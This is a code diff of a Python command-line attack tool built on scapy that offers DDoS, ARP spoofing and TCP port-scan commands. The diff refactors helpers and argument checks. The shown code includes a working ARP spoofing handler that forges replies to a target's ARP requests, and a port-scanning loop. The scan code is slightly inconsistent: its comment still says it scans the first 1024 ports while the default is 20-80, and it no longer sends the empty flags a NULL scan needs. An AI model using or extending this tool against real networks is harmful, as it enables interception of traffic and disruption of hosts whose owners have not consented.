@@ -1,57 +1,14 @@
-import re
-import socket
-import pythonping
 from scapy.all import *
+import pythonping
 from scapy.layers.l2 import ARP
 from scapy.layers.inet import TCP, IP
 
-LOGO = r"""
-  /$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$$$$$$$ /$$$$$$$$ /$$$$$$$              /$$$$$$ /$$$$$$$  /$$$$$$$   /$$$$$$ 
- /$$__  $$ /$$__  $$| $$  | $$| $$$ | $$|__  $$__/| $$_____/| $$__  $$            |_  $$_/| $$__  $$| $$__  $$ /$$__  $$
-| $$  \__/| $$  \ $$| $$  | $$| $$$$| $$   | $$   | $$      | $$  \ $$              | $$  | $$  \ $$| $$  \ $$| $$  \__/
-| $$      | $$  | $$| $$  | $$| $$ $$ $$   | $$   | $$$$$   | $$$$$$$/              | $$  | $$  | $$| $$$$$$$/|  $$$$$$ 
-| $$      | $$  | $$| $$  | $$| $$  $$$$   | $$   | $$__/   | $$__  $$              | $$  | $$  | $$| $$____/  \____  $$
-| $$    $$| $$  | $$| $$  | $$| $$\  $$$   | $$   | $$      | $$  \ $$              | $$  | $$  | $$| $$       /$$  \ $$
-|  $$$$$$/|  $$$$$$/|  $$$$$$/| $$ \  $$   | $$   | $$$$$$$$| $$  | $$             /$$$$$$| $$$$$$$/| $$      |  $$$$$$/
- \______/  \______/  \______/ |__/  \__/   |__/   |________/|__/  |__/            |______/|_______/ |__/       \______/ 
-""".strip()  # Remove unnecessary newlines
-
-BANNER = f"""\n                                           Welcome to the attacks swiss knife\n\n{LOGO}
-\nDISCLAIMER: Use responsibly and ethically.
-\n――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――\n"""
-
-HELP = """Supported commands:
-- set {target} {ip}
-- attack {ddos|arp}
-- help
-- exit"""
-
-IP_REGEX_PATTERN_STRING: str = r'^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.' \
-                               r'(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.' \
-                               r'(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.' \
-                               r'(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
-IP_REGEX_MATCHER: re.Pattern = re.compile(IP_REGEX_PATTERN_STRING)
-
-
-def resolve_target(target: str) -> str:
-    if not IP_REGEX_MATCHER.match(target):
-        try:
-            # Returns: (family, type, proto, canonname, sockaddr)
-            return socket.getaddrinfo(target, None)[0][-1][0]  # Extract IP
-        except socket.gaierror:
-            print("Invalid target! Specify a valid IP address or a domain")
-            return ""
-    else:
-        return target  # Target is IP
-
-
-def get_command() -> str:
-    user_command = input("\n> ").lower()
-    return user_command
+from helper import *
 
 
 def handle_attack(args: list[str]):
-    if len(args) != 2:
+    args_num = len(args)
+    if args_num < 2:
         print('Invalid usage, see "help"')
         return
 
@@ -61,14 +18,20 @@ def handle_attack(args: list[str]):
 
     match args[0]:
         case "ddos":
-            if len(args) != 2:
+            if args_num != 2:
                 print('Invalid usage, see "help"')
                 return
             commit_ddos(target)
         case "arp":
+            if args_num != 2:
+                print('Invalid usage, see "help"')
+                return
             commit_arp_spoofing(target)
         case "tcp" | "null":
-            commit_null_tcp_scan(target)
+            if not 2 <= args_num <= 4:
+                print('Invalid usage, see "help"')
+                return
+            commit_null_tcp_scan(target, *args[2:])
         case _:
             print('Attack not supported! Use "help" to learn more')
 
@@ -86,24 +49,18 @@ def commit_ddos(target: str):
         print("An exception occurred, abandoning attack.")
 
 
-# Receives a VALID IP address!
-def is_local(ip: str) -> bool:
-    ip_bytes = ip.split('.')
-    return ip_bytes[0] == '10' or ip_bytes[0:1] == ['192.168'] \
-        or (ip_bytes[0] == '172' and 16 <= int(ip_bytes[1]) <= 31)
-
-
 def commit_arp_spoofing(target: str):
-    if not is_local(target):
+    if not is_local_ip(target):
         print('Invalid use, please enter a private ip')
         return
 
     def packet_handler(packet):
         arp = packet[ARP]
-        if arp.op != 1 or arp.psrc != target: # Ensuring that the packet is relevant
+        # Ensure that the packet is relevant
+        if arp.op != 1 or arp.psrc != target:
             return
         send(ARP(op=2,
-                 psrc=get_if_addr(conf.iface),
+                 psrc=LOCAL_IP,
                  hwsrc='00:00:00:00:00',
                  pdst=target,
                  hwdst=arp.hwsrc
@@ -113,20 +70,35 @@ def commit_arp_spoofing(target: str):
     sniff(prn=packet_handler, promisc=True, store=False, filter='arp')
 
 
-def commit_null_tcp_scan(target: str):
-    print('Committing DoS, press CTRL+C at any moment to stop.')
+def commit_null_tcp_scan(target: str, ports: str = "", print_closed: bool = False):
     try:
-        for port in range(1, 1025):  # Scan first 1024 ports
-            resp = sr1(IP(src=get_if_addr(conf.iface), dst=target) / TCP(dport=port, flags=""), timeout=1)
+        port_list = extract_ports(ports)
+    except ValueError:
+        print("Specified ports are invalid!")
+        return
+
+    if not port_list:
+        print("No ports specified, scanning ports 20-80")
+        port_list = range(20, 81)
+
+    print(f'Committing NULL TCP port scanning for {target}')
+    try:
+        for port in port_list:  # Scan first 1024 ports
+            to_send = IP(src=LOCAL_IP, dst=target) / TCP(dport=port)
+            # to_send.show()
+            resp = sr1(to_send, verbose=0, timeout=1)
             if resp:
+                print(f"flags={resp[TCP].flags} | ", end="")
                 if resp[TCP].flags == 0x14:  # RST
-                    print(f"Port {port} is closed")
+                    if print_closed:
+                        print(f"Port {port} is closed")
                 else:
                     print(f"**Port {port} is open")
             else:
                 print(f"Port {port} is filtered or closed")
     except (KeyboardInterrupt, InterruptedError):
         print("\nAttack Terminated.")
+
 
 # Returns whether to continue or not
 def handle_command(cmd: list[str]) -> bool:
